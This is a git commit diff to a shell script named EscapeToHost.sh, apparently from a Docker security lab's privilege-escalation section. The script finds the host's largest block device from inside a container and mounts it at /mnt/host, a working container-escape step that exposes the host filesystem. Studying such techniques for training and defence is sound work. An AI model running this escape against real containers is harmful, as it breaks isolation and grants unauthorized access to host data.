b9a0ebd229bd446854e1d6e5d8186f5ed86dce9d
Alexey Krasnov <aliaksxssv@Alexeys-MacBook-Pro.local>
2025-12-01 10:00:45 +0100

    fix mount priv escalation

--- docker/src/06 Privilege Escalation/EscapeToHost.sh
+++ docker/src/06 Privilege Escalation/EscapeToHost.sh
@@ -15,14 +15,20 @@ error=""
 
 echo "Discovering root host block devices ..."
 
+# Discover root host block device
 device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}')
 
 echo "Trying to mount root host device /dev/${device} ..."
 
-if ! mount /dev/$device /mnt/ >/dev/null 2>&1; then
+# Create mount point directory
+mkdir -p /mnt/host
+
+# Try to mount root host device
+if ! mount /dev/$device /mnt/host/ >/dev/null 2>&1; then
     error="Failed to mount /dev/$device"
 fi
 
+# Display result
 if [[ -n "$error" ]]; then
     echo -e "${RED}Error! Mount attempt was done but failed: $error ${RESET}"
     else
